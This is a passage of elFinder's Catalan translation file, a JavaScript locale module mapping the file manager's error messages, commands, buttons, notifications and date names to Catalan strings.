/**
 * Català translation
 * @author Sergio Jovani <lesergi@gmail.com>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.ca = {
		translator : 'Sergio Jovani &lt;lesergi@gmail.com&gt;',
		language   : 'Català',
		direction  : 'ltr',
		dateFormat : 'M d, Y h:i A', // will show like: febr. 28, 2022 11:14 AM
		fancyDateFormat : '$1 h:i A', // will show like: Avui 11:14 AM
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220228-111450
		messages   : {
			'getShareText' : 'Compartir',
			'Editor ': 'Editor de codi',
			/********************************** errors **********************************/
			'error'                : 'Error',
			'errUnknown'           : 'Error desconegut.',
			'errUnknownCmd'        : 'Ordre desconeguda.',
			'errJqui'              : 'La configuració de jQuery UI no és vàlida. S\'han d\'incloure els components "selectable", "draggable" i "droppable".',
			'errNode'              : 'elFinder necessita crear elements DOM.',
			'errURL'               : 'La configuració de l\'elFinder no és vàlida! L\'opció URL no està configurada.',
			'errAccess'            : 'Accés denegat.',
			'errConnect'           : 'No s\'ha pogut connectar amb el rerefons.',
			'errAbort'             : 'S\'ha interromput la connexió.',
			'errTimeout'           : 'Temps de connexió excedit.',
			'errNotFound'          : 'No s\'ha trobat el rerefons.',
			'errResponse'          : 'La resposta del rerefons no és vàlida.',
			'errConf'              : 'La configuració del rerefons no és vàlida.',
			'errJSON'              : 'No està instal·lat el mòdul JSON del PHP.',
			'errNoVolumes'         : 'No s\'han trobat volums llegibles.',
			'errCmdParams'         : 'Els paràmetres per l\'ordre "$1" no són vàlids.',
			'errDataNotJSON'       : 'Les dades no són JSON.',
			'errDataEmpty'         : 'Les dades estan buides.',
			'errCmdReq'            : 'La sol·licitud del rerefons necessita el nom de l\'ordre.',
			'errOpen'              : 'No s\'ha pogut obrir "$1".',
			'errNotFolder'         : 'L\'objecte no és una carpeta.',
			'errNotFile'           : 'L\'objecte no és un fitxer.',
			'errRead'              : 'No s\'ha pogut llegir "$1".',
			'errWrite'             : 'No s\'ha pogut escriure a "$1".',
			'errPerm'              : 'Permís denegat.',
			'errLocked'            : '"$1" està bloquejat i no podeu canviar-li el nom, moure-lo ni suprimir-lo.',
			'errExists'            : 'Ja existeix un fitxer anomenat "$1".',
			'errInvName'           : 'El nom de fitxer no és vàlid.',
			'errInvDirname'        : 'Nom de carpeta no vàlid.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'No s\'ha trobat la carpeta.',
			'errFileNotFound'      : 'No s\'ha trobat el fitxer.',
			'errTrgFolderNotFound' : 'No s\'ha trobat la carpeta de destí "$1".',
			'errPopup'             : 'El navegador ha evitat obrir una finestra emergent. Autoritzeu-la per obrir el fitxer.',
			'errMkdir'             : 'No s\'ha pogut crear la carpeta "$1".',
			'errMkfile'            : 'No s\'ha pogut crear el fitxer "$1".',
			'errRename'            : 'No s\'ha pogut canviar el nom de "$1".',
			'errCopyFrom'          : 'No està permès copiar fitxers des del volum "$1".',
			'errCopyTo'            : 'No està permès copiar fitxers al volum "$1".',
			'errMkOutLink'         : 'No es pot crear un enllaç fora de l\'arrel del volum.', // from v2.1 added 03.10.2015
			'errUpload'            : 'S\'ha produït un error en la càrrega.',  // old name - errUploadCommon
			'errUploadFile'        : 'No s\'ha pogut carregar "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'No s\'han trobat fitxers per carregar.',
			'errUploadTotalSize'   : 'Les dades excedeixen la mida màxima permesa.', // old name - errMaxSize
			'errUploadFileSize'    : 'El fitxer excedeix la mida màxima permesa.', //  old name - errFileMaxSize
			'errUploadMime'        : 'El tipus de fitxer no està permès.',
			'errUploadTransfer'    : 'S\'ha produït un error en transferir "$1".',
			'errUploadTemp'        : 'No es pot crear un fitxer temporal per carregar-lo.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'L\'objecte "$1" ja existeix en aquesta ubicació i no es pot substituir per un altre tipus.', // new
			'errReplace'           : 'No es pot substituir "$1".',
			'errSave'              : 'No s\'ha pogut desar "$1".',
			'errCopy'              : 'No s\'ha pogut copiar "$1".',
			'errMove'              : 'No s\'ha pogut moure "$1".',
			'errCopyInItself'      : 'No s\'ha pogut copiar "$1" a si mateix.',
			'errRm'                : 'No s\'ha pogut suprimir "$1".',
			'errTrash'             : 'No es pot a la paperera.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'No es poden eliminar els fitxers font.',
			'errExtract'           : 'No s\'han pogut extreure els fitxers de "$1".',
			'errArchive'           : 'No s\'ha pogut crear l\'arxiu.',
			'errArcType'           : 'El tipus d\'arxiu no està suportat.',
			'errNoArchive'         : 'El fitxer no és un arxiu o és un tipus no suportat.',
			'errCmdNoSupport'      : 'El rerefons no suporta aquesta ordre.',
			'errReplByChild'       : 'No es pot reemplaçar la carpeta “$1” per un element que conté.',
			'errArcSymlinks'       : 'Per raons de seguretat, no es permet extreure arxius que contenen enllaços simbòlics.', // edited 24.06.2012
			'errArcMaxSize'        : 'Els fitxers de l\'arxiu excedeixen la mida màxima permesa.',
			'errResize'            : 'No s\'ha pogut redimensionar "$1".',
			'errResizeDegree'      : 'El grau de rotació no és vàlid.',  // added 7.3.2013
			'errResizeRotate'      : 'No es pot girar la imatge.',  // added 7.3.2013
			'errResizeSize'        : 'Mida de la imatge no vàlida.',  // added 7.3.2013
			'errResizeNoChange'    : 'La mida de la imatge no ha canviat.',  // added 7.3.2013
			'errUsupportType'      : 'El tipus de fitxer no està suportat.',
			'errNotUTF8Content'    : 'El fitxer "$1" no està en UTF-8 i no es pot editar.',  // added 9.11.2011
			'errNetMount'          : 'No es pot muntar "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Protocol no compatible.',     // added 17.04.2012
			'errNetMountFailed'    : 'El muntatge ha fallat.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Es requereix amfitrió.', // added 18.04.2012
			'errSessionExpires'    : 'La teva sessió ha caducat per inactivitat.',
			'errCreatingTempDir'   : 'No es pot crear el directori temporal: "$1"',
			'errFtpDownloadFile'   : 'No es pot descarregar el fitxer des d\'FTP: "$1"',
			'errFtpUploadFile'     : 'No es pot carregar el fitxer a FTP: "$1"',
			'errFtpMkdir'          : 'No es pot crear un directori remot a FTP: "$1"',
			'errArchiveExec'       : 'Error en arxivar fitxers: "$1"',
			'errExtractExec'       : 'Error en extreure fitxers: "$1"',
			'errNetUnMount'        : 'No es pot desmuntar.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'No convertible a UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Proveu el navegador modern, si voleu carregar la carpeta.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'S\'ha esgotat el temps en cercar "$1". El resultat de la cerca és parcial.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Cal una reautorització.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'El nombre màxim d\'articles seleccionables és d\' $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'No es pot restaurar des de la paperera. No es pot identificar la destinació de la restauració.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'No s\'ha trobat l\'editor per a aquest tipus de fitxer.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'S\'ha produït un error al costat del servidor.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'No es pot buidar la carpeta "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Hi ha errors d\' $1 més.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Podeu crear fins a $1 carpetes alhora.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Crea arxiu',
			'cmdback'      : 'Enrere',
			'cmdcopy'      : 'Copia',
			'cmdcut'       : 'Retalla',
			'cmddownload'  : 'Descarrega',
			'cmdduplicate' : 'Duplica',
			'cmdedit'      : 'Edita el fitxer',
			'cmdextract'   : 'Extreu els fitxers de l\'arxiu',
			'cmdforward'   : 'Endavant',
			'cmdgetfile'   : 'Selecciona els fitxers',
			'cmdhelp'      : 'Quant a aquest programari',
			'cmdhome'      : 'Inici',
			'cmdinfo'      : 'Obté informació',
			'cmdmkdir'     : 'Nova carpeta',
			'cmdmkdirin'   : 'A la carpeta nova', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nou fitxer',
			'cmdopen'      : 'Obre',
			'cmdpaste'     : 'Enganxa',
			'cmdquicklook' : 'Previsualitza',
			'cmdreload'    : 'Torna a carregar',
			'cmdrename'    : 'Canvia el nom',
			'cmdrm'        : 'Suprimeix',
			'cmdtrash'     : 'A les escombraries', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Restaurar', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Cerca fitxers',
			'cmdup'        : 'Vés al directori superior',
			'cmdupload'    : 'Carrega fitxers',
			'cmdview'      : 'Visualitza',
			'cmdresize'    : 'Redimensiona la imatge',
			'cmdsort'      : 'Ordena',
			'cmdnetmount'  : 'Munta el volum de xarxa', // added 18.04.2012
			'cmdnetunmount': 'Desmuntar', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'A Llocs', // added 28.12.2014
			'cmdchmod'     : 'Canvia el mode', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Obre una carpeta', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Restableix l\'amplada de la columna', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Pantalla completa', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Moure\'s', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Buida la carpeta', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Desfer', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Refer', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferències', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Seleccionar tot', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Seleccioneu cap', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Inverteix la selecció', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Obre en una finestra nova', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Amaga (preferència)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Tanca',
			'btnSave'   : 'Desa',
			'btnRm'     : 'Suprimeix',
			'btnApply'  : 'Aplica',
			'btnCancel' : 'Cancel·la',
			'btnNo'     : 'No',
			'btnYes'    : 'Sí',
			'btnMount'  : 'Munta',  // added 18.04.2012
			'btnApprove': 'Anar a $1 i aprovar', // from v2.1 added 26.04.2012
			'btnUnmount': 'Desmuntar', // from v2.1 added 30.04.2012
			'btnConv'   : 'Converteix', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Aquí',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volum',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Tots',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Tipus MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Nom de l\'arxiu',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Desa i tanca', // from v2.1 added 12.6.2015
			'btnBackup' : 'Còpia de seguretat', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Canvia el nom',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Canvia el nom (tots)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Anterior ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Pròxim ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Guardar com', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'S\'està obrint la carpeta',
			'ntffile'     : 'S\'està obrint el fitxer',
			'ntfreload'   : 'S\'està tornant a carregar el contingut de la carpeta',
			'ntfmkdir'    : 'S\'està creant el directori',
			'ntfmkfile'   : 'S\'estan creant el fitxers',
			'ntfrm'       : 'S\'estan suprimint els fitxers',
			'ntfcopy'     : 'S\'estan copiant els fitxers',
			'ntfmove'     : 'S\'estan movent els fitxers',
			'ntfprepare'  : 'S\'està preparant per copiar fitxers',
			'ntfrename'   : 'S\'estan canviant els noms del fitxers',
			'ntfupload'   : 'S\'estan carregant els fitxers',
			'ntfdownload' : 'S\'estan descarregant els fitxers',
			'ntfsave'     : 'S\'estan desant els fitxers',
			'ntfarchive'  : 'S\'està creant l\'arxiu',
			'ntfextract'  : 'S\'estan extreient els fitxers de l\'arxiu',
			'ntfsearch'   : 'S\'estan cercant els fitxers',
			'ntfresize'   : 'Canviar la mida de les imatges',
			'ntfsmth'     : 'S\'estan realitzant operacions',
			'ntfloadimg'  : 'S\'està carregant la imatge',
			'ntfnetmount' : 'Muntatge del volum de xarxa', // added 18.04.2012
			'ntfnetunmount': 'S\'està desmuntant el volum de xarxa', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Adquisició de la dimensió de la imatge', // added 20.05.2013
			'ntfreaddir'  : 'Lectura de la informació de la carpeta', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Obtenint l\'URL de l\'enllaç', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Canvi de mode de fitxer', // from v2.1 added 20.6.2015
			'ntfpreupload': 'S\'està verificant el nom del fitxer de càrrega', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Creació d\'un fitxer per descarregar', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Obtenció d\'informació del camí', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'S\'està processant el fitxer penjat', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Fent llençar a les escombraries', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'S\'està fent la restauració des de la paperera', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'S\'està comprovant la carpeta de destinació', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'S\'està desfent l\'operació anterior', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'S\'està refent l\'anterior desfet', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Comprovació de continguts', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Paperera', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'desconegut',
			'Today'       : 'Avui',
			'Yesterday'   : 'Ahir',
			'msJan'       : 'gen.',
			'msFeb'       : 'febr.',
			'msMar'       : 'març',
			'msApr'       : 'abr.',
			'msMay'       : 'maig',
			'msJun'       : 'juny',
			'msJul'       : 'jul.',
			'msAug'       : 'ag.',
			'msSep'       : 'set.',
			'msOct'       : 'oct.',
			'msNov'       : 'nov.',
			'msDec'       : 'des.',
			'January'     : 'gener',
			'February'    : 'febrer',
			'March'       : 'març',
			'April'       : 'Abril',
			'May'         : 'maig',
			'June'        : 'juny',
			'July'        : 'juliol',
			'August'      : 'Agost',
			'September'   : 'setembre',
			'October'     : 'Octubre',
			'November'    : 'de novembre',
			'December'    : 'desembre',
			'Sunday'      : 'diumenge',
			'Monday'      : 'dilluns',
			'Tuesday'     : 'dimarts',
			'Wednesday'   : 'dimecres',
			'Thursday'    : 'dijous',
			'Friday'      : 'divendres',
			'Saturday'    : 'dissabte',
			'Sun'         : 'diumenge',
			'Mon'         : 'dilluns',
			'Tue'         : 'dimarts',
			'Wed'         : 'dimecres',
			'Thu'         : 'dijous',
			'Fri'         : 'divendres',
			'Sat'         : 'dissabte',

			/******************************** sort variants ********************************/
			'sortname'          : 'per nom',
			'sortkind'          : 'per tipus',
			'sortsize'          : 'per mida',
			'sortdate'          : 'per data',
			'sortFoldersFirst'  : 'Primer les carpetes',
			'sortperm'          : 'amb permís', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'per modalitat',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'pel propietari',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'per grup',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'També Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'Nou fitxer.txt', // added 10.11.2015
			'untitled folder'   : 'Carpeta nova',   // added 10.11.2015
			'Archive'           : 'Nou Arxiu',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Nou fitxer.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Dossier',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Es necessita confirmació',
			'confirmRm'       : 'Voleu suprimir els fitxers?<br />L\'acció es podrà desfer!',
			'confirmRepl'     : 'Voleu reemplaçar el fitxer antic amb el nou?',
			'confirmRest'     : 'Voleu substituir l\'element existent per l\'element de la paperera?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'No és a UTF-8<br/>Convertiu a UTF-8?<br/>Els continguts es converteixen en UTF-8 desant després de la conversió.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'No s\'ha pogut detectar la codificació de caràcters d\'aquest fitxer. S\'ha de convertir temporalment a UTF-8 per editar-lo.<br/>Seleccioneu la codificació de caràcters d\'aquest fitxer.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'S\'ha modificat.<br/>Perdre feina si no deseu els canvis.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Esteu segur que voleu moure els elements a la paperera?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Esteu segur que voleu moure els elements a "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Aplica a tot',
			'name'            : 'Nom',
			'size'            : 'Mida',
			'perms'           : 'Permisos',
			'modify'          : 'Modificat',
			'kind'            : 'Tipus',
			'read'            : 'llegir',
			'write'           : 'escriure',
			'noaccess'        : 'sense accés',
			'and'             : 'i',
			'unknown'         : 'desconegut',
			'selectall'       : 'Selecciona tots els fitxers',
			'selectfiles'     : 'Selecciona el(s) fitxer(s)',
			'selectffile'     : 'Selecciona el primer fitxer',
			'selectlfile'     : 'Selecciona l\'últim fitxer',
			'viewlist'        : 'Vista en llista',
			'viewicons'       : 'Vista en icones',
			'viewSmall'       : 'Petites icones', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Icones mitjanes', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Icones grans', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Icones extra grans', // from v2.1.39 added 22.5.2018
			'places'          : 'Llocs',
			'calc'            : 'Calcula',
			'path'            : 'Camí',
			'aliasfor'        : 'Àlies per',
			'locked'          : 'Bloquejat',
			'dim'             : 'Dimensions',
			'files'           : 'Fitxers',
			'folders'         : 'Carpetes',
			'items'           : 'Elements',
			'yes'             : 'sí',
			'no'              : 'no',
			'link'            : 'Enllaç',
			'searcresult'     : 'Resultats de la cerca',
			'selected'        : 'Elements seleccionats',
			'about'           : 'Quant a',
			'shortcuts'       : 'Dreceres',
			'help'            : 'Ajuda',
			'webfm'           : 'Gestor de fitxers web',
			'ver'             : 'Versió',
			'protocolver'     : 'versió de protocol',
			'homepage'        : 'Pàgina del projecte',
			'docs'            : 'Documentació',
			'github'          : 'Bifurca\'ns a GitHub',
			'twitter'         : 'Segueix-nos a Twitter',
			'facebook'        : 'Uniu-vos a Facebook',
			'team'            : 'Equip',
			'chiefdev'        : 'cap desenvolupador',
			'developer'       : 'desenvolupador',
			'contributor'     : 'col·laborador',
			'maintainer'      : 'mantenidor',
			'translator'      : 'traductor',
			'icons'           : 'Icones',
			'dontforget'      : 'i no oblideu agafar la vostra tovallola',
			'shortcutsof'     : 'Les dreceres estan inhabilitades',
			'dropFiles'       : 'Arrossegueu els fitxers aquí',
			'or'              : 'o',
			'selectForUpload' : 'Seleccioneu els fitxer a carregar',
			'moveFiles'       : 'Mou els fitxers',
			'copyFiles'       : 'Copia els fitxers',
			'restoreFiles'    : 'Restaurar elements', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Suprimeix dels llocs',
			'aspectRatio'     : 'Relació d\'aspecte',
			'scale'           : 'Escala',
			'width'           : 'Amplada',
			'height'          : 'Alçada',
			'resize'          : 'Redimensiona',
			'crop'            : 'Retalla',
			'rotate'          : 'Girar',
			'rotate-cw'       : 'Gireu 90 graus CW',
			'rotate-ccw'      : 'Gireu 90 graus cap a la dreta',
			'degree'          : '°',
			'netMountDialogTitle' : 'Munta el volum de xarxa', // added 18.04.2012
			'protocol'            : 'Protocol', // added 18.04.2012
			'host'                : 'Amfitrió', // added 18.04.2012
			'port'                : 'Port', // added 18.04.2012
			'user'                : 'Usuari', // added 18.04.2012
			'pass'                : 'Contrasenya', // added 18.04.2012
			'confirmUnmount'      : 'Esteu desmuntant $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Deixa anar o enganxar fitxers des del navegador', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Deixa anar fitxers, enganxar URL o imatges (porta-retalls) aquí', // from v2.1 added 07.04.2014
			'encoding'        : 'Codificació', // from v2.1 added 19.12.2014
			'locale'          : 'Localització',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Objectiu: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Cerca per tipus MIME d\'entrada', // from v2.1 added 22.5.2015
			'owner'           : 'Propietari', // from v2.1 added 20.6.2015
			'group'           : 'Grup', // from v2.1 added 20.6.2015
			'other'           : 'Altres', // from v2.1 added 20.6.2015
			'execute'         : 'Executar', // from v2.1 added 20.6.2015
			'perm'            : 'Permís', // from v2.1 added 20.6.2015
			'mode'            : 'Mode', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'La carpeta està buida', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'La carpeta està buida\\A Drop per afegir elements', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'La carpeta està buida\\Un toc llarg per afegir elements', // from v2.1.6 added 30.12.2015
			'quality'         : 'Qualitat', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Sincronització automàtica',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Mou-te',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Obteniu l\'enllaç URL', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Articles seleccionats ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID de la carpeta', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Permet l\'accés fora de línia', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Per tornar a autenticar', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'S\'està carregant...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Obriu diversos fitxers', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Esteu provant d\'obrir els fitxers $1. Esteu segur que voleu obrir-lo al navegador?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Els resultats de la cerca estan buits a l\'objectiu de la cerca.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'És editar un fitxer.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Heu seleccionat articles d\' $1.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Tens articles d\' $1 al porta-retalls.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'La cerca incremental només és des de la vista actual.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Reintegrar', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 completat', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Menú contextual', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Pas de pàgina', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Arrels de volum', // from v2.1.16 added 16.9.2016
			'reset'           : 'Restableix', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Color de fons', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Selector de colors', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Quadrícula de 8 píxels', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Habilitat', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Discapacitat', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Els resultats de la cerca estan buits a la vista actual.\\APmeu [Retorn] per ampliar l\'objectiu de la cerca.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Els resultats de la cerca de la primera lletra estan buits a la vista actual.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Etiqueta de text', // from v2.1.17 added 13.10.2016
			'minsLeft'        : 'Queden $1 min', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Torna a obrir amb la codificació seleccionada', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Desa amb la codificació seleccionada', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Seleccioneu la carpeta', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Recerca de la primera lletra', // from v2.1.23 added 24.3.2017
			'presets'         : 'Presets', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Hi ha massa articles perquè no es puguin a la paperera.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Àrea de text', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Buida la carpeta "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'No hi ha elements a una carpeta "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferència', // from v2.1.26 added 28.6.2017
			'language'        : 'Llenguatge', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inicialitzeu la configuració desada en aquest navegador', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Configuració de la barra d\'eines', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 caràcters restants.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... Queden 1 $ línies.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Suma', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Mida aproximada del fitxer', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Centra\'t en l\'element de diàleg amb el ratolí',  // from v2.1.30 added 2.11.2017
			'select'          : 'Seleccioneu', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Acció en seleccionar un fitxer', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Obriu amb l\'editor utilitzat l\'última vegada', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Inverteix la selecció', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Esteu segur que voleu canviar el nom de $1 als elements seleccionats com ara $2?<br/>Això no es pot desfer!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Canviar el nom del lot', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Número', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Afegeix un prefix', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Afegeix un sufix', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Canvia l\'extensió', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Configuració de les columnes (visualització de llista)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Tots els canvis es reflectiran immediatament a l\'arxiu.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Qualsevol canvi no es reflectirà fins que no desmunteu aquest volum.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Els següents volums muntats en aquest volum també s\'han desmuntat. Segur que el desmuntareu?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informació de selecció', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algorismes per mostrar el hash del fitxer', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Elements d\'informació (tauler d\'informació de selecció)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Premeu de nou per sortir.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Barra d\'eines', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Espai de treball', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Diàleg', // from v2.1.38 added 4.4.2018
			'all'             : 'Tots', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Mida de les icones (visualització d\'icones)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Obriu la finestra de l\'editor maximitzat', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Com que la conversió per API no està disponible actualment, feu la conversió al lloc web.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Després de la conversió, s\'ha de carregar amb l\'URL de l\'element o un fitxer descarregat per desar el fitxer convertit.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Converteix al lloc de $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integracions', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Aquest elFinder té integrats els següents serveis externs. Consulteu les condicions d\'ús, la política de privadesa, etc. abans d\'utilitzar-lo.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Mostra els elements ocults', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Amaga els elements ocults', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Mostra/amaga els elements ocults', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Tipus de fitxers per activar amb "Fitxer nou"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Tipus de fitxer de text', // from v2.1.41 added 7.8.2018
			'add'             : 'Afegeix', // from v2.1.41 added 7.8.2018
